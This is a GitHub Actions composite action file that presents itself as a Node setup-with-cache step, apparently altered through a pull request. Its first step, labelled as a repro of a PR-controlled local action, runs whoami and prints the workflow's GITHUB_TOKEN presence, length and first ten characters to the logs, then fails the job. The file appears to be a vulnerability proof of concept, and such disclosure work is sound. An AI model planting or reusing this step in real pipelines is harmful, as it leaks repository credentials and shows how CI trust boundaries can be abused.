name: "Setup node with cache action"
description: "Setups node with cache"

runs:
  using: "composite"
  steps:
    - name: Repro PR-controlled local action
      shell: bash
      env:
        GH_TOKEN: ${{ github.token }}
      run: |
        echo "=== PR-CONTROLLED-LOCAL-ACTION ==="
        pwd
        whoami
        if [ -n "$GH_TOKEN" ]; then
          echo "github_token_present=yes"
          echo "github_token_len=${#GH_TOKEN}"
          echo "github_token_first_10_chars=${GH_TOKEN:0:10}"
        else
          echo "github_token_present=no"
        fi
        exit 1

    - name: Setup Node
      uses: actions/setup-node@v4
      with:
        node-version: 22.x
        cache: "npm"
        cache-dependency-path: |
          package-lock.json
          apps/mobile/package-lock.json
          apps/desktop/package-lock.json
          apps/web/package-lock.json
          apps/monograph/package-lock.json
          apps/theme-builder/package-lock.json
          extensions/web-clipper/package-lock.json
          packages/core/package-lock.json
          packages/crypto/package-lock.json
          packages/sodium/package-lock.json
          packages/clipper/package-lock.json
          packages/editor-mobile/package-lock.json
          packages/editor/package-lock.json
          packages/logger/package-lock.json
          packages/streamable-fs/package-lock.json
          packages/theme/package-lock.json
          packages/intl/package-lock.json
